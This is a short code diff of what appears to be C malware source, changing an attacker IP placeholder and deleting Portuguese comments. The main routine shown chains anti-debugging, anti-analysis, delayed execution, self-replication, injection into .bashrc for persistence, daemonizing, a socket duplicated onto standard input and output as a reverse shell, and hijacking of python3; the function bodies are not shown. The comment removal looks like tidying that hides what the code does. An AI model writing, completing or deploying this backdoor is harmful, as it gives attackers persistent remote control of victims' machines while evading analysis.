@@ -10,7 +10,7 @@
 #include <time.h>
 #include <sys/stat.h>
 
-#define IP "ip aq"
+#define IP "ip here"
 #define PORT 1234
 
 void anti_debug() {
@@ -144,16 +144,16 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    //Sistemas de defesa contra Eng. Reversa
+
     anti_debug();
     anti_analysis();
     delay_execution();
     
-    //Self replication & injeção no bashrc
+
     self_replit(argv[0]);
     inject_bashrc();
     
-    //Daemon
+
     daemonize();
 
     int sockfd;
@@ -174,7 +174,6 @@ int main(int argc, char *argv[]) {
     dup2(sockfd, 2);
 
     if (check_python3()) {
-        //Hijacking no python3
         hijack_python3();
     }
 
